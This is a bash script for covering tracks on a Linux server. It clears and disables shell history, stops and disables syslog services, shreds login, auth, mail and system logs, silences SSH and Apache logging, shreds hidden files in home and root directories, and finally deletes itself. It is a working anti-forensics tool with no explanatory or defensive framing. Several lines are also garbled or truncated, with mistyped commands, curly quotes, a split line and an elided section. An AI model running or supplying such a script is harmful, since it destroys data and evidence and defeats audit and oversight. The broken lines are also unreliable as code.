#! /bin/bash
apt-get install -y chkconfig
#stop history
echo “unset HISTFILE” >> /etc/profile
history -c
find ~/.bash_history -exec shred -fvzu -n 3 {} \;
service rsyslog stop
chkconfig rsyslog off
service sysklogd stop
chkconfig sysklogd off
service msyslog stop
chkconfigm syslog off
service syslog-ng stop
chkconfig syslog-ng off
shred -fvzu -n 3 /var/log/wtmp
shred -fvzu -n 3 /var/log/lastlog
shred -fvzu -n 3 /var/run/utmp
shred -fvzu -n 3 /var/log/mail.*
shred -fvzu -n 3 /var/log/syslog*
shred -fvzu -n 3 /var/log/messages*
#stop logging ssh
cp /etc/ssh/aa
sed -i ‘s/LogLevel.*/LogLevel QUIET/’ /etc/ssh/sshd_config
shred -fvzu -n 3 /var/log/auth.log*
services sh restart
#delete hidden files
find / -type f -name “.*” | grep -v “.bash_profile” | grep -v “.bashrc” | grep “home” | xargs shred -fvzu -n 3
find / -type f -name “.*” | grep -v “.bash_profile” | grep -v “.bashrc” | grep “root” | xargs shred -fvzu -n 3 #stop apache2 logging
sed -i ‘s|ErrorLog [$/a-zA-Z0-9{}_.]*|ErrorLog /dev/null|g’ /etc/apache2/sites-available/default
sed -i ‘s|CustomLog [$/a-zA-Z0-9{}_.]*|CustomLog /dev/null|g’ /etc/apache2/sites-available/default
sed -i ‘s|LogLevel [$/a-zA-Z0-9{}_.]*|LogLevel emerg|g’ /etc/apache2/sites-available/default
sed -i ‘s|ErrorLog [$/a-zA-Z0-9{}_.]*|ErrorLog /dev/null|g’ /etc/apache2/sites-available/default-ssl
sed -i ‘s|CustomLog [$/a-zA-Z0-9{}_.]*|CustomLog /dev/null|g’
/etc/apache2/sites-available/default-ssl
sed -i ‘s|LogLevel [$/a-zA-Z0-9{}_.]*|LogLevel emerg|g’ /etc/apache2/sites-available/default-ssl
…

shred -fvzu -n 3 /var/log/apache2/*
service apache2 restart
#self delete
find ./ -type f | grep logging.sh | xargs -I {} shred -fvzu -n 3 {} \;
